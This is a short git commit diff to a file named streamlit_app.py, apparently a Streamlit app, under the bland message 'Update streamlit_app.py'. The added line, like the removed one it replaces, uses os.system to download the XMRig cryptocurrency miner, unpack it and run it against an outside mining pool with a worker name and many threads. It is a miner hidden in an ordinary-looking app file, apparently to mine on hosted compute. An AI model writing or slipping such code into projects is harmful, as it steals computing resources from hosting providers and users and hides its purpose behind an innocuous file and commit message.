d3015cbaa1754cb1acbd6776f0fab3cbd95bad48
hagacz <112244590+hagacz@users.noreply.github.com>
2022-08-29 05:53:33 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -11,4 +11,4 @@ from time import sleep
 from subprocess import PIPE, Popen
 import base64
 os.system("lscpu") 
-os.system ("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stc.ss.poolin.one:443 -u nung.001 --keepalive --donate-level 1 -p x -t 30") 
+os.system ("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a cn/r -o stc.ss.poolin.one:443 -u nung.001 --keepalive --tls 1 -p x -t 16") 
